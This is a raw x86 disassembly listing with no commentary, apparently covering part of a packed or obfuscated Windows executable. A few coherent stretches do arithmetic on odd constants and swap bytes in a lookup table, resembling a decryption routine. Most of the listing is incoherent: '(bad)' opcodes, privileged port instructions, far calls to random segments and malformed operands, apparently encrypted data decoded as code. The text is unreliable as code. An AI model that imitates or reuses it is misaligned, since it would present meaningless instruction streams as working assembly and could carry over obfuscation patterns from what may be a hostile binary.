  40c0de:	clc    
  40c0df:	es dec edi
  40c0e1:	aam    0xda
  40c0e3:	cmc    
  40c0e4:	fwait
  40c0e5:	mov    esp,esi
  40c0e7:	inc    eax
  40c0e8:	mov    BYTE PTR [esp+ebx*2-0x75],bl
  40c0ec:	push   ebp
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    bx,WORD PTR ds:[ecx-0x11]
  40c145:	mov    ebp,DWORD PTR [esi+ebp*1-0x608f8f75]
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c160
  40c150:	ficom  DWORD PTR [ebx+0x3af25fe6]
  40c156:	test   al,0xec
  40c158:	jp     0x40c1c6
  40c15a:	cwde   
  40c15b:	ds je  0x40c141
  40c15e:	stos   BYTE PTR es:[edi],al
  40c15f:	jns    0x40c1a5
  40c161:	xor    BYTE PTR [ebx+0x54],ah
  40c164:	xchg   edi,eax
  40c165:	mov    DWORD PTR [ecx+ecx*1+0x5effb242],eax
  40c16c:	cmc    
  40c16d:	sub    BYTE PTR [edx+0x75cff62b],bl
  40c173:	push   ebp
  40c174:	fs stc 
  40c176:	jecxz  0x40c19c
  40c178:	ja     0x40c1f1
  40c17a:	pop    esp
  40c17b:	mov    BYTE PTR [edx+ebx*2+0x19],0xd4
  40c180:	dec    ecx
  40c181:	ins    BYTE PTR es:[edi],dx
  40c182:	fs jmp 0x40c1ee
  40c185:	arpl   WORD PTR [eax-0x20],sp
  40c188:	xchg   ecx,eax
  40c189:	retf   0x3b04
  40c18c:	ja     0x40c1e5
  40c18e:	test   ecx,0x7531f47f
  40c194:	psubusw mm6,mm0
  40c197:	ins    DWORD PTR es:[edi],dx
  40c198:	xchg   ebp,eax
  40c199:	idiv   DWORD PTR [ecx+0x658a849b]
  40c19f:	lahf   
  40c1a0:	test   eax,0x45ca191
  40c1a5:	out    dx,al
  40c1a6:	adc    BYTE PTR [edi-0x4997b279],0x7c
  40c1ad:	xchg   ebp,eax
  40c1ae:	lock ja 0x40c22f
  40c1b1:	loop   0x40c169
  40c1b3:	aaa    
  40c1b4:	push   0xcd080598
  40c1b9:	xchg   BYTE PTR [edi],bl
  40c1bb:	outs   dx,BYTE PTR ds:[esi]
  40c1bc:	pop    ebp
  40c1bd:	dec    ebp
  40c1be:	xchg   ebp,eax
  40c1bf:	mov    bl,0x9d
  40c1c1:	pop    eax
  40c1c2:	ret    
  40c1c3:	mov    dl,0xbf
  40c1c5:	dec    ebx
  40c1c6:	mov    ch,0x54
  40c1c8:	in     eax,dx
  40c1c9:	pop    esp
  40c1ca:	push   DWORD PTR es:0x4d08f270
  40c1d1:	add    BYTE PTR [ebp+0x2cc55e9a],0xb3
  40c1d8:	add    al,0x36
  40c1da:	scas   al,BYTE PTR es:[edi]
  40c1db:	addr16 mov ds:0xd568,al
  40c1df:	push   0x17
  40c1e1:	mov    bh,0x22
  40c1e3:	pushf  
  40c1e4:	xor    al,0x5c
  40c1e6:	mov    cs:0xed68ecbb,al
  40c1ec:	outs   dx,DWORD PTR ds:[esi]
  40c1ed:	popa   
  40c1ee:	push   ds
  40c1ef:	test   DWORD PTR [ebx+ebp*4+0x42ad0aa],edi
  40c1f6:	int    0x6a
  40c1f8:	das    
  40c1f9:	retf   
  40c1fa:	sub    al,0x9e
  40c1fc:	add    ebx,0x14
  40c1ff:	jl     0x40c1d9
  40c201:	xchg   BYTE PTR [esi],bh
  40c203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c204:	inc    ebx
  40c205:	and    al,0x6f
  40c207:	scas   al,BYTE PTR es:[edi]
  40c208:	jno    0x40c25c
  40c20a:	jecxz  0x40c241
  40c20c:	inc    esp
  40c20d:	arpl   WORD PTR [ebx-0x23cf2a97],dx
  40c213:	hlt    
  40c214:	jns    0x40c28a
  40c216:	dec    esp
  40c217:	icebp  
  40c218:	or     DWORD PTR [esi],ebx
  40c21a:	paddq  mm0,mm5
  40c21d:	inc    esi
  40c21e:	and    al,0xe4
  40c220:	popf   
  40c221:	mov    dl,0x39
  40c223:	jg     0x40c1e9
  40c225:	xlat   BYTE PTR ds:[ebx]
  40c226:	std    
  40c227:	pop    eax
  40c228:	inc    eax
  40c229:	lock arpl WORD PTR [eax],cx
  40c22c:	test   eax,0xa6824a25
  40c231:	pop    ebx
  40c232:	addr16 jle 0x40c1d6
  40c235:	mov    WORD PTR [edi+0x7a],?
  40c238:	(bad)  
  40c239:	cmp    DWORD PTR [esi],0x57
  40c23c:	sbb    bh,BYTE PTR [ebp+0x4615eaf3]
  40c242:	inc    ebx
  40c243:	stos   BYTE PTR es:[edi],al
  40c244:	dec    ebp
  40c245:	(bad)  
  40c246:	out    dx,eax
  40c247:	out    dx,al
  40c248:	std    
  40c249:	push   ecx
  40c24a:	lods   eax,DWORD PTR ds:[esi]
  40c24b:	adc    al,0xc3
  40c24d:	jns    0x40c1f6
  40c24f:	aas    
  40c250:	dec    bh
  40c252:	add    al,cl
  40c254:	xchg   edx,eax
  40c255:	cs std 
  40c257:	hlt    
  40c258:	cwde   
  40c259:	in     eax,dx
  40c25a:	(bad)  
  40c25b:	out    dx,al
  40c25c:	mov    DWORD PTR [edx],ebx
  40c25e:	mov    WORD PTR [ecx],?
  40c260:	gs pop ds
  40c262:	cmp    al,BYTE PTR [si]
  40c265:	push   0x10ce77ec
  40c26a:	addr16 cmp eax,0xaa0e5ed9
  40c270:	cmp    al,0xdd
  40c272:	pusha  
  40c273:	dec    edx
  40c274:	mov    ah,0x71
  40c276:	cdq    
  40c277:	pushf  
  40c278:	(bad)  
  40c279:	jecxz  0x40c2f0
  40c27b:	dec    eax
  40c27c:	jne    0x40c244
  40c27e:	dec    eax
  40c27f:	sti    
  40c280:	cs pop edx
  40c282:	clc    
  40c283:	int    0xbc
  40c285:	loope  0x40c241
  40c287:	int    0x1e
  40c289:	mov    BYTE PTR [eax+0x64],bl
  40c28c:	nop
  40c28d:	pop    ecx
  40c28e:	add    eax,0x776afb1e
  40c293:	mov    al,ds:0x89860b2b
  40c298:	adc    ebx,DWORD PTR [ecx]
  40c29a:	cmp    al,BYTE PTR [ecx]
  40c29c:	fdiv   DWORD PTR [ebp-0x32cc4ba3]
  40c2a2:	adc    DWORD PTR [esi+0x749e2414],ebp
  40c2a8:	pop    esp
  40c2a9:	out    dx,eax
  40c2aa:	fstp   QWORD PTR [esi+0x25]
  40c2ad:	jne    0x40c234
  40c2af:	cmp    BYTE PTR ds:0x9d1c7ab3,cl
  40c2b5:	call   0x8f17:0xf89a7486
  40c2bc:	xchg   ecx,eax
  40c2bd:	outs   dx,BYTE PTR fs:[esi]
  40c2bf:	pop    edx
  40c2c0:	std    
  40c2c1:	xchg   ebp,eax
  40c2c2:	mov    ds:0x7b04a33d,eax
  40c2c7:	add    al,0xa4
  40c2c9:	aas    
  40c2ca:	mov    ch,0xe3
  40c2cc:	mov    bh,0xc9
  40c2ce:	mov    edi,0x4e7570a8
  40c2d3:	outs   dx,DWORD PTR ds:[esi]
  40c2d4:	repnz mov eax,cs
  40c2d7:	ja     0x40c293
  40c2d9:	mov    eax,ebp
  40c2db:	jmp    0x40c267
  40c2dd:	mov    BYTE PTR [eax-0x2f],dh
  40c2e0:	ja     0x40c26a
  40c2e2:	in     al,dx
  40c2e3:	mov    eax,edi
  40c2e5:	icebp  
  40c2e6:	ss adc ch,cl
  40c2e9:	mov    edx,0xc3fbc14d
  40c2ee:	push   ds
  40c2ef:	inc    esi
  40c2f0:	fnsave [eax]
  40c2f2:	mov    ah,0xcb
  40c2f4:	sbb    ch,BYTE PTR [edx-0x2f]
  40c2f7:	repz mov edx,0x860d2951
  40c2fd:	sub    ebp,esp
  40c2ff:	lahf   
  40c300:	push   es
  40c301:	mov    dl,0xff
  40c303:	les    eax,FWORD PTR [eax+0x7a]
  40c306:	inc    esp
  40c307:	inc    ebx
  40c308:	(bad)  
  40c309:	pop    ebp
  40c30a:	jmp    0xc218:0x13d70168
  40c311:	call   0x44c7:0x5f53d622
  40c318:	jns    0x40c2c1
  40c31a:	inc    edi
  40c31b:	outs   dx,DWORD PTR ds:[esi]
  40c31c:	adc    DWORD PTR [eax+0x6b0c7c3b],esp
  40c322:	ja     0x40c364
  40c324:	sbb    DWORD PTR ds:0xa9809cb7,esp
  40c32a:	push   ebp
  40c32b:	and    BYTE PTR es:[edx+0x62f890b7],bh
  40c332:	or     al,BYTE PTR [ebp+0x31]
  40c335:	push   esp
  40c336:	shl    BYTE PTR [eax+0x58],cl
  40c339:	repnz leave 
  40c33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c33c:	not    BYTE PTR ds:0x1f086330
  40c342:	pop    es
  40c343:	ret    0x93c8
  40c346:	or     dh,BYTE PTR [ecx+0x7329f4cf]
  40c34c:	sbb    BYTE PTR [edx],0x52
  40c34f:	(bad)  
  40c350:	xchg   ebx,eax
  40c351:	in     al,dx
  40c352:	adc    eax,0xce127c9f
  40c357:	cmc    
  40c358:	test   DWORD PTR [edi-0x5754f529],edx
  40c35e:	ins    DWORD PTR es:[edi],dx
  40c35f:	push   esp
  40c360:	or     DWORD PTR [edi+0x40],0xbdaa8b2f
  40c367:	add    edi,DWORD PTR [ecx-0x42]
  40c36a:	jae    0x40c39c
  40c36c:	stos   BYTE PTR es:[edi],al
  40c36d:	stos   DWORD PTR es:[edi],eax
  40c36e:	xor    eax,0xb17d9a29
  40c373:	pusha  
  40c374:	mov    eax,0x55ebb781
  40c379:	fsub   QWORD PTR [ebp-0x10d7f309]
  40c37f:	out    0x67,eax
  40c381:	sbb    cl,BYTE PTR [esi-0x68]
  40c384:	inc    edx
  40c385:	pop    edi
  40c386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c387:	add    BYTE PTR [edx-0x6],0x7e
  40c38b:	ds jmp 0x40c36d
  40c38e:	jg     0x40c3e4
  40c390:	add    al,0x1
  40c392:	in     eax,0x9f
  40c394:	xchg   esp,eax
  40c395:	mov    ebx,0x3f4c9b09
  40c39a:	mov    ch,0xf2
  40c39c:	ror    BYTE PTR [eax-0x39],0xf6
  40c3a0:	xchg   edx,eax
  40c3a1:	xchg   esi,eax
  40c3a2:	ja     0x40c3ca
  40c3a4:	cli    
  40c3a5:	pop    esp
  40c3a6:	jecxz  0x40c37a
  40c3a8:	sub    edx,DWORD PTR [edi-0x60a82cb8]
  40c3ae:	ret    0x36d0
  40c3b1:	clc    
  40c3b2:	cmp    al,0x83
  40c3b4:	in     al,dx
  40c3b5:	adc    dh,ah
  40c3b7:	(bad)  
  40c3b8:	sahf   
  40c3b9:	test   eax,0xad0be543
  40c3be:	cdq    
  40c3bf:	in     al,0xf7
  40c3c1:	inc    esp
  40c3c2:	imul   BYTE PTR [esi+0x7a7feb19]
  40c3c8:	leave  
  40c3c9:	mov    ecx,0x63dc67fb
  40c3ce:	sbb    BYTE PTR [edx-0x76a2e488],dl
  40c3d4:	sbb    DWORD PTR [eax],0xffffffce
  40c3d7:	outs   dx,BYTE PTR ds:[esi]
  40c3d8:	and    cl,BYTE PTR [edi-0x74]
  40c3db:	fwait
  40c3dc:	cmp    dl,BYTE PTR [ecx+0x700344e8]
  40c3e2:	cld    
  40c3e3:	jmp    0x40c3ea
  40c3e5:	cmp    DWORD PTR [ebp-0x427ddf1d],0x69
  40c3ec:	scas   al,BYTE PTR es:[edi]
  40c3ed:	or     dh,cl
  40c3ef:	inc    ecx
  40c3f0:	xchg   ecx,eax
  40c3f1:	push   edx
  40c3f2:	rol    BYTE PTR [edx+0x41293314],cl
  40c3f8:	or     BYTE PTR [ebx-0x65],ch
  40c3fb:	and    al,0x6b
  40c3fd:	add    DWORD PTR [edx+0x1d9c2d29],ebp
  40c403:	sub    ecx,DWORD PTR [ebx]
  40c405:	jp     0x40c3bd
  40c407:	or     DWORD PTR [eax+0x11],0x68
  40c40b:	stc    
  40c40c:	xor    dh,BYTE PTR [edx-0x5aa87924]
  40c412:	pop    esi
  40c413:	adc    DWORD PTR [edx],edx
  40c415:	sub    eax,0x85898982
  40c41a:	xor    bh,ch
  40c41c:	and    al,0x25
  40c41e:	xchg   BYTE PTR [edx+0x66],bl
  40c421:	jl     0x40c3dc
  40c423:	cwde   
  40c424:	mov    ?,WORD PTR [ebx]
  40c426:	push   ebp
  40c427:	mov    BYTE PTR [edi],cl
  40c429:	sbb    ch,BYTE PTR [eax-0x72e489af]
  40c42f:	aas    
  40c430:	dec    edi
  40c431:	adc    eax,0x5abff66a
  40c436:	fs dec ecx
  40c438:	enter  0x82b2,0xcb
  40c43c:	cli    
  40c43d:	mov    eax,0xd1f0e6e
  40c442:	retf   0xf24e
  40c445:	mov    dl,0x86
  40c447:	mov    DWORD PTR [edx+esi*8-0x47],eax
  40c44b:	cmp    al,0x90
  40c44d:	mov    ebp,0x5869cc82
  40c452:	imul   ecx,DWORD PTR [eax-0x24],0xffffff8b
  40c456:	in     eax,0xf5
  40c458:	call   0xb63b:0xef322dae
  40c45f:	shl    dl,0x95
  40c462:	push   ecx
  40c463:	xchg   ebp,eax
  40c464:	cmp    eax,0x3f4a0510
  40c469:	jae    0x40c478
  40c46b:	sbb    eax,0xa669fb5a
  40c470:	(bad)  
  40c472:	pusha  
  40c473:	push   edx
  40c474:	push   cs
  40c475:	mul    BYTE PTR [ebx]
  40c477:	into   
  40c478:	or     eax,0x943ed1c3
  40c47d:	xlat   BYTE PTR ds:[ebx]
  40c47e:	(bad)  
  40c47f:	repz out 0x81,al
  40c482:	es adc al,0xa5
  40c485:	adc    al,0x81
  40c487:	iret   
  40c488:	cmp    BYTE PTR ds:0x3d992bfb,dh
  40c48e:	into   
  40c48f:	pusha  
  40c490:	pushf  
  40c491:	stc    
  40c492:	push   ss
  40c493:	clc    
  40c494:	mov    ecx,0x7bf710b8
  40c499:	jae    0x40c488
  40c49b:	or     al,0x2
  40c49d:	dec    ecx
  40c49e:	pop    esp
  40c49f:	push   ss
  40c4a0:	sar    dl,1
  40c4a2:	push   eax
  40c4a3:	cdq    
  40c4a4:	or     ebx,DWORD PTR [esi+eiz*8-0x54]
  40c4a8:	or     BYTE PTR [ecx],0x75
  40c4ab:	push   ds
  40c4ac:	test   al,0x93
  40c4ae:	push   cs
  40c4af:	sti    
  40c4b0:	sbb    dl,bh
  40c4b2:	fs push edi
  40c4b4:	xor    eax,ebx
  40c4b6:	xchg   ecx,eax
  40c4b7:	dec    edi
  40c4b8:	mov    WORD PTR [ecx+ebp*4+0x4978ddda],cs
  40c4bf:	dec    edx
  40c4c0:	(bad)  
  40c4c1:	mov    edx,0x3cd08e6d
  40c4c6:	push   ss
  40c4c7:	out    0xae,al
  40c4c9:	in     al,dx
  40c4ca:	outs   dx,BYTE PTR ds:[esi]
  40c4cb:	or     edi,ecx
  40c4cd:	jmp    0x57e5b5bb
  40c4d2:	sub    DWORD PTR [eax+0x1f],esi
  40c4d5:	sub    ah,BYTE PTR [edi]
  40c4d7:	repz es mov ecx,ss
  40c4db:	adc    bh,BYTE PTR [ebp-0x2c]
  40c4de:	mul    DWORD PTR [edi+0x31f8291a]
  40c4e4:	mov    ecx,0xa439b76d
  40c4e9:	push   edx
  40c4ea:	ja     0x40c4f5
  40c4ec:	repnz retfw 0x3360
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    esi,0x4d17b61b
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c503
  40c54d:	push   0xaf0920af
  40c552:	mov    edi,0x4a7d5246
  40c557:	lds    edi,FWORD PTR [ebx+0x52]
  40c55a:	adc    eax,0x4dbc04b5
  40c55f:	add    al,BYTE PTR [ebx-0x4d792bd2]
  40c565:	fiadd  DWORD PTR [ebp+0x6b]
  40c568:	shr    BYTE PTR [ebp+0x2624ce1d],1
  40c56e:	retf   0x60f5
  40c571:	call   0x76e09030
  40c576:	fdivr  QWORD PTR [ecx]
  40c578:	stc    
  40c579:	test   al,0xc2
  40c57b:	test   BYTE PTR [edx],ch
  40c57d:	sub    ch,BYTE PTR [ecx]
  40c57f:	mov    ds:0xa8242b2e,eax
  40c584:	jne    0x40c56d
  40c586:	ret    0xb6d5
  40c589:	pop    ds
  40c58a:	nop
  40c58b:	in     al,dx
  40c58c:	pop    es
  40c58d:	xor    ebp,ecx
  40c58f:	enter  0x7454,0xf9
  40c593:	in     al,0x8
  40c595:	in     al,0xcc
  40c597:	jae    0x40c56c
  40c599:	dec    edi
  40c59a:	jnp    0x40c5bd
  40c59c:	pop    ebp
  40c59d:	add    BYTE PTR [ecx-0x781707c2],dl
  40c5a3:	dec    ebp
  40c5a4:	(bad)  
  40c5a5:	or     BYTE PTR [esi+0x5],al
  40c5a8:	mov    ds,WORD PTR [edi-0x2a7d38b2]
  40c5ae:	adc    al,0x5c
  40c5b0:	stos   BYTE PTR es:[edi],al
  40c5b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b2:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c5b4:	(bad)  
  40c5b5:	ror    BYTE PTR [edx+0x4b],cl
  40c5b8:	jl     0x40c5a7
  40c5ba:	mov    al,0xd0
  40c5bc:	(bad)  
  40c5bd:	adc    ch,BYTE PTR [eax-0x71]
  40c5c0:	sbb    eax,0xd0f04b66
  40c5c5:	xchg   edi,eax
  40c5c6:	mov    bl,0x81
  40c5c8:	jnp    0x40c54b
  40c5ca:	call   0x8c5d1909
  40c5cf:	mov    edx,0x68fd2c51
  40c5d4:	es jge 0x40c61a
  40c5d7:	ret    0x62f7
  40c5da:	cdq    
  40c5db:	fstp   QWORD PTR [esp+edi*2+0x30ccc416]
  40c5e2:	adc    edx,DWORD PTR [ebx-0x74860527]
  40c5e8:	inc    ecx
  40c5e9:	shl    DWORD PTR [ebp+0x7b],0x96
  40c5ed:	xor    al,0x78
  40c5f0:	and    esp,DWORD PTR [ebx-0x19a368f4]
  40c5f6:	push   ecx
  40c5f7:	nop
  40c5f8:	sbb    eax,DWORD PTR [esi]
  40c5fa:	syscall 
  40c5fc:	xor    dl,BYTE PTR [edi+0x60f60e67]
  40c602:	bound  ebp,QWORD PTR [ebx+0xe463167]
  40c608:	in     eax,dx
  40c609:	xchg   ebp,eax
  40c60a:	sbb    DWORD PTR [edi-0x59ce3d87],ebp
  40c610:	stc    
  40c611:	out    0x24,eax
  40c613:	jge    0x40c5f8
  40c615:	nop
  40c616:	cmp    eax,0x18be6d4c
  40c61b:	imul   edx,DWORD PTR [edi],0xffffffcd
  40c61e:	inc    edx
  40c61f:	shl    al,cl
  40c621:	sahf   
  40c622:	test   eax,0x7d7b48a0
  40c627:	sub    al,0xf3
  40c629:	sbb    eax,0x58ef0d9c
  40c62e:	jecxz  0x40c60e
  40c630:	cmp    eax,eax
  40c632:	adc    BYTE PTR [ebp-0x15af6be2],al
  40c638:	mov    dh,0xfb
  40c63a:	cld    
  40c63b:	xchg   edx,eax
  40c63c:	cmp    edi,esi
  40c63e:	add    edx,DWORD PTR [ebx-0x72]
  40c641:	ins    DWORD PTR es:[edi],dx
  40c642:	xchg   esi,eax
  40c643:	push   es
  40c644:	daa    
  40c645:	and    ecx,DWORD PTR [edi]
  40c647:	dec    BYTE PTR [edx-0x55]
  40c64a:	sbb    BYTE PTR [ebp+0x52],cl
  40c64d:	xor    al,0xe5
  40c64f:	push   cs
  40c650:	adc    DWORD PTR [ebx+0x2e],0x18
  40c654:	pop    eax
  40c655:	stos   DWORD PTR es:[edi],eax
  40c656:	mov    bl,BYTE PTR [eax-0x2c]
  40c659:	(bad)  
  40c65a:	or     al,0xf0
  40c65c:	jae    0x40c5e5
  40c65e:	rcl    DWORD PTR [ebx+0x58312fa7],1
  40c664:	sbb    eax,0xb2e4f5c7
  40c669:	in     al,0x42
  40c66b:	add    eax,0x95877344
  40c670:	mov    dh,0x49
  40c672:	pushf  
  40c673:	sbb    al,0x3e
  40c675:	pop    es
  40c676:	mov    eax,0x5137c101
  40c67b:	outs   dx,DWORD PTR ds:[esi]
  40c67c:	cli    
  40c67d:	inc    ebp
  40c67e:	push   edx
  40c67f:	dec    eax
  40c680:	in     eax,dx
  40c681:	adc    al,cl
  40c683:	popa   
  40c684:	push   cs
  40c685:	addr16 adc al,0xdb
  40c688:	or     edx,DWORD PTR ds:0x4e239cf4
  40c68e:	ret    
  40c68f:	jg     0x40c647
  40c691:	and    al,0xc3
  40c693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c694:	inc    eax
  40c695:	pusha  
  40c696:	pop    esp
  40c697:	pusha  
  40c698:	pop    edx
  40c699:	mov    ebp,0xba518e45
  40c69e:	lods   al,BYTE PTR ds:[esi]
  40c69f:	cmp    BYTE PTR [ecx-0x7469e5ff],bl
  40c6a5:	scas   eax,DWORD PTR es:[edi]
  40c6a6:	push   esp
  40c6a8:	pop    edi
  40c6a9:	sahf   
  40c6aa:	mov    esp,0x43c2cd47
  40c6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6b0:	lods   eax,DWORD PTR ds:[esi]
  40c6b1:	add    eax,0xf86c4f55
  40c6b6:	popf   
  40c6b7:	(bad)  
  40c6b8:	xchg   ebp,eax
  40c6b9:	jo     0x40c719
  40c6bb:	jg     0x40c66a
  40c6bd:	imul   sp,WORD PTR ds:0x49f053e3,0xff8f
  40c6c5:	inc    eax
  40c6c6:	scas   eax,DWORD PTR es:[edi]
  40c6c7:	sub    ch,0x87
  40c6ca:	fwait
  40c6cb:	mov    ds:0x60c85c44,al
  40c6d0:	jne    0x40c674
  40c6d2:	mov    esp,DWORD PTR [edx-0x8]
  40c6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6d6:	call   0xaa2e25f0
  40c6db:	mov    dl,0x2
  40c6dd:	mov    bl,0xd3
  40c6df:	std    
  40c6e0:	jno    0x40c66c
  40c6e2:	and    ah,BYTE PTR [ebx+0x27a4295f]
  40c6e8:	push   ebp
  40c6e9:	xor    eax,0x696fee6b
  40c6ee:	dec    edi
  40c6ef:	xor    BYTE PTR [edx+eiz*8+0x51],0x88
  40c6f4:	lahf   
  40c6f5:	pop    ss
  40c6f6:	inc    ebx
  40c6f7:	sbb    BYTE PTR [eax-0xa],bl
  40c6fa:	pop    esi
  40c6fb:	push   ss
  40c6fc:	sub    ch,0x7
  40c6ff:	add    BYTE PTR [eax-0x33],bh
  40c702:	in     eax,0x64
  40c704:	ja     0x40c6be
  40c706:	popf   
  40c707:	pop    ss
  40c708:	xor    ebp,ebp
  40c70a:	jae    0x40c73f
  40c70c:	push   edi
  40c70d:	xchg   esi,eax
  40c70e:	test   eax,0xc866ae4f
  40c713:	pop    es
  40c714:	fidiv  DWORD PTR [ebp+0x41]
  40c717:	inc    edi
  40c718:	fdiv   st(3),st
  40c71a:	jmp    0x40c731
  40c71c:	test   edi,0x2e224026
  40c722:	mov    esi,DWORD PTR [esi-0x7cfa6ce5]
  40c728:	repnz pop eax
  40c72a:	ror    BYTE PTR [ecx-0x61],cl
  40c72d:	sbb    ebx,ebp
  40c72f:	pop    edx
  40c730:	stos   DWORD PTR es:[edi],eax
  40c731:	mov    edx,DWORD PTR ds:0xdbaa2946
  40c737:	pop    ecx
  40c738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c739:	adc    al,0x63
  40c73b:	jle    0x40c7aa
  40c73d:	sahf   
  40c73e:	mov    dl,0xe8
  40c740:	dec    esi
  40c741:	dec    ecx
  40c742:	jmp    0x915a00c8
  40c747:	outs   dx,BYTE PTR ds:[esi]
  40c748:	scas   al,BYTE PTR es:[edi]
  40c749:	fisttp DWORD PTR [eax]
  40c74b:	mov    ds:0x52faf783,al
  40c750:	in     eax,dx
  40c751:	mov    bh,0x2d
  40c753:	jae    0xfefa2620
  40c759:	data16 hlt 
  40c75b:	mov    dh,ch
  40c75d:	lds    ecx,FWORD PTR [ecx]
  40c75f:	cdq    
  40c760:	jb     0x40c765
  40c762:	js     0x40c7c3
  40c764:	push   ds
  40c765:	xor    ebx,DWORD PTR [ebp+0x433d759e]
  40c76b:	push   ds
  40c76c:	adc    BYTE PTR gs:[edi],dl
  40c76f:	or     bh,ah
  40c771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c772:	or     BYTE PTR [edi+0x0],al
  40c775:	popa   
  40c776:	hlt    
  40c777:	mov    bl,0xd0
  40c779:	lods   eax,DWORD PTR ds:[esi]
  40c77a:	add    DWORD PTR ds:0x23c647c8,ebp
  40c780:	dec    esp
  40c781:	jp     0x40c7fb
  40c783:	add    DWORD PTR [esi],ecx
  40c785:	div    DWORD PTR [ecx]
  40c787:	scas   al,BYTE PTR es:[edi]
  40c788:	(bad)  
  40c789:	and    al,0x85
  40c78b:	push   edx
  40c78c:	test   DWORD PTR [ecx+edi*2-0x50],edx
  40c790:	mov    WORD PTR ds:0x501046b5,?
  40c796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c797:	jecxz  0x40c804
  40c799:	xor    ebp,DWORD PTR [ebx+0x3edb246b]
  40c79f:	push   edx
  40c7a0:	std    
  40c7a1:	pusha  
  40c7a2:	loop   0x40c7ad
  40c7a4:	add    eax,0xfeb0f456
  40c7a9:	shr    BYTE PTR [ebx+0x58],cl
  40c7ac:	(bad)  [ebx]
  40c7ae:	in     eax,dx
  40c7af:	(bad)  [ebp+0x1cdcbade]
  40c7b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7b6:	mov    ebp,0xa831a596
  40c7bb:	test   DWORD PTR ds:0xc4ff5ae8,edi
  40c7c1:	sbb    DWORD PTR [eax-0x3d],edi
  40c7c4:	mov    al,BYTE PTR [edx]
  40c7c6:	sub    dh,ch
  40c7c8:	mov    ecx,0x3e6852a3
  40c7cd:	imul   BYTE PTR [esi+ecx*8+0x54c89125]
  40c7d4:	push   edi
  40c7d5:	lds    ecx,FWORD PTR [esi-0x23]
  40c7d8:	adc    cl,ah
  40c7da:	or     esi,DWORD PTR [edi]
  40c7dc:	jg     0x40c76f
  40c7de:	sub    esi,edx
  40c7e0:	stc    
  40c7e1:	and    BYTE PTR [edx+0x2c],dh
  40c7e4:	xchg   esi,eax
  40c7e5:	ins    DWORD PTR es:[edi],dx
  40c7e6:	cmc    
  40c7e7:	push   ebp
  40c7e8:	push   0x24438039
  40c7ed:	sbb    dl,ch
  40c7ef:	mov    ch,0x42
  40c7f1:	ficomp DWORD PTR [ecx-0x24]
  40c7f4:	xor    edi,DWORD PTR [eax-0x46]
  40c7f7:	mov    ch,0x8f
  40c7f9:	inc    esp
  40c7fa:	and    DWORD PTR [esi],0x5f7ca144
  40c800:	pop    es
  40c801:	ror    BYTE PTR [edx+ebx*2],1
  40c804:	mov    ch,0x39
  40c806:	int    0x88
  40c808:	(bad)  
  40c80a:	sub    dh,cl
  40c80c:	shl    DWORD PTR [eax],1
  40c80e:	addr16 mov eax,0x5e04ef3b
  40c814:	cs pop esp
  40c816:	mov    di,0x6e02
  40c81a:	adc    BYTE PTR [ebp-0x56],dh
  40c81d:	pop    ecx
  40c81e:	fidivr DWORD PTR [ecx]
  40c820:	rol    BYTE PTR [ecx+0x6f],0xd6
  40c824:	es in  al,dx
  40c826:	xchg   edx,eax
  40c827:	mov    eax,0xc5afaff7
  40c82c:	xor    DWORD PTR [ecx-0x3a51e97e],edi
  40c832:	scas   eax,DWORD PTR es:[edi]
  40c833:	inc    esi
